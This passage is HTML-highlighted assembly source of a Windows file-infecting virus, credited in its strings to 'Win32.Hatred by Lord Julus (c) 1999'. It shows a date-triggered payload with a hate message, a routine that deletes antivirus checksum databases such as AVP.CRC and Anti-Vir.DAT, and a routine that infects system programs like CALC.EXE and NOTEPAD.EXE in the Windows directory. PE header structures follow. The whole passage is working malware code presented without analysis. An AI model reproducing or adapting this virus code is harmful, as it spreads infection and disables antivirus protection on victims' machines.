</span><span class="sc5">finish</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">wintitle</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Hatred by Lord Julus (c) 1999"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wintext</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Today is the 7th !! Today is the day of hate !!"</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"With Heart feel Hatred ! Black blood runs thru my veins !"</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Hatred !!!! Hatred !!!!"</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"(escape is your escape)"</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">y</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">screen</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">systime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Erase Checksum Files                                                   Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">EraseChecksums</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pushad</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; point to Search Record</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; point av files list</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">locate_next_av</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_kill_done</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; is this the end?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_kill_done</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">; push search record address</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">; push filename address</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; find first match</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">                    </span><span class="sc1">; check for EAX = -1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_av_file</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.FileName</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; ESI = pointer to filename...</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                               </span><span class="sc1">; push filename address</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DeleteFileA</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; delete file!</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; close the find handle</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_av_file</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_next_av</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_kill_done</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EraseChecksums</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_list</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; the av files to kill</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IVP.NTZ"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Anti-Vir.DAT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKList.MS"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKList.CPS"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SmartCHK.MS"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SmartCHK.CPS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Direct Infect Routine                                                  Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">DirectInfect</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                       </span><span class="sc1">; direct ass-kick</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tempdir</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; find Windows dir</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; change to it...</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">direct_list</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; take the files...</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_loop</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">                         </span><span class="sc1">; open &amp; infect</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">; next file</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">direct_loop</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DirectInfect</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_list</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CDPLAYER.XEX'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CALC.XEX'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PBRUSH.XEX'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MPLAYER.XEX'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NOTEPAD.XEX'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WINHLP32.XEX'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">direct_list</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CDPLAYER.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CALC.EXE'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PBRUSH.EXE'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MPLAYER.EXE'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NOTEPAD.EXE'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WINHLP32.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ</span><span class="sc0">
</span><span class="sc1">;Û Equates, structures, data                                              Û</span><span class="sc0">
</span><span class="sc1">;ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">

</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">           </span><span class="sc1">; DOS .EXE header</span><span class="sc0">
</span><span class="sc5">MZ_magic</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Magic number</span><span class="sc0">
</span><span class="sc5">MZ_cblp</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Bytes on last page of file</span><span class="sc0">
</span><span class="sc5">MZ_cp</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Pages in file</span><span class="sc0">
</span><span class="sc5">MZ_crlc</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Relocations</span><span class="sc0">
</span><span class="sc5">MZ_cparhdr</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Size of header in paragraphs</span><span class="sc0">
</span><span class="sc5">MZ_minalloc</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Minimum extra paragraphs needed</span><span class="sc0">
</span><span class="sc5">MZ_maxalloc</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Maximum extra paragraphs needed</span><span class="sc0">
</span><span class="sc5">MZ_ss</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial (relative) SS value</span><span class="sc0">
</span><span class="sc5">MZ_sp</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial SP value</span><span class="sc0">
</span><span class="sc5">MZ_csum</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Checksum</span><span class="sc0">
</span><span class="sc5">MZ_ip</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial IP value</span><span class="sc0">
</span><span class="sc5">MZ_cs</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Initial (relative) CS value</span><span class="sc0">
</span><span class="sc5">MZ_lfarlc</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; File address of relocation table</span><span class="sc0">
</span><span class="sc5">MZ_ovno</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; Overlay number</span><span class="sc0">
</span><span class="sc5">MZ_res</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Reserved words</span><span class="sc0">
</span><span class="sc5">MZ_oemid</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; OEM identifier (for MZ_oeminfo)</span><span class="sc0">
</span><span class="sc5">MZ_oeminfo</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; OEM information; MZ_oemid specific</span><span class="sc0">
</span><span class="sc5">MZ_res2</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Reserved words</span><span class="sc0">
</span><span class="sc5">MZ_lfanew</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">; File address of new exe header</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DOS_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_HEADER</span><span class="sc0">
                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">          </span><span class="sc1">; Portable Exe File</span><span class="sc0">
</span><span class="sc5">PE_Magic</span><span class="sc0">                 </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Machine</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Machine type</span><span class="sc0">
</span><span class="sc5">NumberOfSections</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Number of sections</span><span class="sc0">
</span><span class="sc5">TimeDateStamp</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Date and Time</span><span class="sc0">
</span><span class="sc5">PointerToSymbolTable</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Pointer to Symbols</span><span class="sc0">
</span><span class="sc5">NumberOfSymbols</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Number of Symbols</span><span class="sc0">
</span><span class="sc5">SizeOfOptionalHeader</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; Size of Optional Header</span><span class="sc0">
</span><span class="sc5">Characteristics</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">; File characteristics</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">
                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">       </span><span class="sc1">; Image data directory</span><span class="sc0">
</span><span class="sc5">DD_VirtualAddress</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; Virtual address</span><span class="sc0">
</span><span class="sc5">DD_Size</span><span class="sc0">              </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; Virtual size</span><span class="sc0">
</span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">        </span><span class="sc1">;;;;;;;;;</span><span class="sc0">
                                         </span><span class="sc1">;</span><span class="sc0">
